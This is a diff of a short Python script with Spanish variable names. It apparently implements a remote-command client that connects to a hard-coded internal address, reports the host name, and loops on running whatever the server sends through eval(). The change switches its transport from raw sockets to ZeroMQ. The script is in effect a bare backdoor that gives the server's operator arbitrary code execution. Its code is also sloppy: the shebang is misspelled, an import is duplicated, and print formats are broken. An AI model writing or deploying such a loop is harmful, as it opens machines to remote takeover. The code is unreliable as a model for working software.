@@ -1,34 +1,39 @@
 #!/usr/bin/pyhton/env
 
+import zmq
 import os
 import sys
 import socket
+import os
 
-s = socket.socket()
-s.connect(("10.121.3.60", 8002))
+s = socket
+context = zmq.Context()
+socket = context.socket(zmq.REQ)
+servSock = 'tcp://{0}:{1}'.format('10.121.3.60', '5556')
+socket.connect(servSock)
 
-nombrePC = str(socket.gethostbyname_ex(socket.gethostname()))
+nombrePC = s.gethostbyname_ex(s.gethostname())
 comando = []
 envioInicial = nombrePC
 devuelve = []
 
 while True:
     
-    devuelve.append(envioInicial)
-    devuelve.append(comando)
+    devuelve.extend(envioInicial)
+    devuelve.extend(comando)
     darFormatoDevuelve = str(devuelve)
 
     print('Enviando al servidor:{0}'.format(darFormatoDevuelve))
-    s.send(darFormatoDevuelve)
+    socket.send(darFormatoDevuelve)
     
-    recibido = s.recv(1024)
+    recibido = socket.recv()
     print('Recibiendo desde el servidor:{0}'.format(recibido))
     
     if recibido:
         try:
             #print('Ejecutando el EVAL')
-            comando = str(eval(recibido))
-            print('comando contiene:'.format(comando))
+            comando = eval(recibido)
+            print('comando contiene:'.format(str(comando)))
             devuelve = []
             darFormatoDevuelve = ''
         except Exception as e:
